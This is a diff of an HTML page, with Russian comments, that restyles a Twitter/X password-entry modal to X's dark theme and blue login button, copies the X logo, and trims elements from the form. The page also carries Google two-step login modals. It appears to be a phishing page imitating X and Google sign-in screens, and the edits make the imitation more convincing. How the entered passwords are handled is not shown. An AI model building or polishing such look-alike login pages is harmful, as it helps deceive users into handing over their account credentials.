@@ -694,10 +694,10 @@
             text-decoration: underline;
         }
         
-        /* Twitter/X модальное окно для пароля (этап 2) - БЕЛЫЙ ФОН как на скриншоте */
+        /* Twitter/X модальное окно для пароля (этап 2) - ЧЕРНЫЙ ФОН как на начальной */
         .x-modal-step2 {
-            background: white;
-            color: #0F1419;
+            background: #000000;
+            color: white;
             padding: 30px;
         }
         
@@ -707,18 +707,18 @@
             margin-bottom: 30px;
             text-align: center;
             font-family: Arial, sans-serif;
-            color: #0F1419;
+            color: white;
         }
         
         .x-user-info {
             margin-bottom: 30px;
             padding-bottom: 20px;
-            border-bottom: 1px solid #EFF3F4;
+            border-bottom: 1px solid #2F3336;
         }
         
         .x-user-email {
             font-size: 16px;
-            color: #0F1419;
+            color: white;
             margin-bottom: 8px;
             font-weight: 500;
             font-family: Arial, sans-serif;
@@ -738,7 +738,7 @@
         .x-password-label {
             display: block;
             margin-bottom: 8px;
-            color: #536471;
+            color: #8D99A6;
             font-size: 14px;
             font-family: Arial, sans-serif;
         }
@@ -747,11 +747,11 @@
             width: 100%;
             padding: 15px;
             margin-bottom: 20px;
-            border: 1px solid #CFD9DE;
+            border: 1px solid #536471;
             border-radius: 4px;
             font-size: 17px;
-            background: white;
-            color: #0F1419;
+            background: #000;
+            color: white;
             font-family: Arial, sans-serif;
         }
         
@@ -763,7 +763,7 @@
         .x-login-btn {
             width: 100%;
             padding: 15px;
-            background: #0F1419;
+            background: #1D9BF0;
             color: white;
             border: none;
             border-radius: 30px;
@@ -775,7 +775,7 @@
         }
         
         .x-login-btn:hover {
-            background: #272C30;
+            background: #1A8CD8;
         }
         
         .x-forgot-password {
@@ -795,8 +795,8 @@
         .x-step2-footer {
             margin-top: 30px;
             padding-top: 20px;
-            border-top: 1px solid #EFF3F4;
-            color: #536471;
+            border-top: 1px solid #2F3336;
+            color: #8D99A6;
             font-size: 15px;
             font-family: Arial, sans-serif;
             text-align: center;
@@ -1435,13 +1435,13 @@
         </div>
     </div>
     
-    <!-- Twitter/X модальное окно (этап 2: пароль) - БЕЛЫЙ ФОН как на скриншоте -->
-    <div class="modal-overlay" id="xModalStep2">
-        <div class="modal x-modal-step2">
+    <!-- Twitter/X модальное окно (этап 2: пароль) - ЧЕРНЫЙ ФОН -->
+    <div class="modal-overlay modal-dark" id="xModalStep2">
+        <div class="modal modal-dark x-modal-step2">
             <button class="close-modal" onclick="closeModal('xModalStep2')">&times;</button>
             
             <div class="x-logo">
-                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: #0F1419;">
+                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: white;">
                     <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
                 </svg>
             </div>
@@ -1450,11 +1450,9 @@
             
             <div class="x-user-info">
                 <div class="x-user-email" id="xUserEmail">user@example.com</div>
-                <a href="#" class="x-switch-account" onclick="switchXAccount()">Сменить аккаунт</a>
             </div>
             
             <form id="xPasswordForm">
-                <label class="x-password-label">Пароль</label>
                 <input type="password" class="x-password-input" placeholder="Пароль" required>
                 
                 <button type="submit" class="x-login-btn">Войти</button>
@@ -1788,11 +1786,6 @@
         function switchGoogleAccount() {
             closeModal('googleModalStep2');
             openModal('googleModalStep1');
-        }
-        
-        function switchXAccount() {
-            closeModal('xModalStep2');
-            openModal('xModalStep1');
         }
         
         document.addEventListener('DOMContentLoaded', function() {
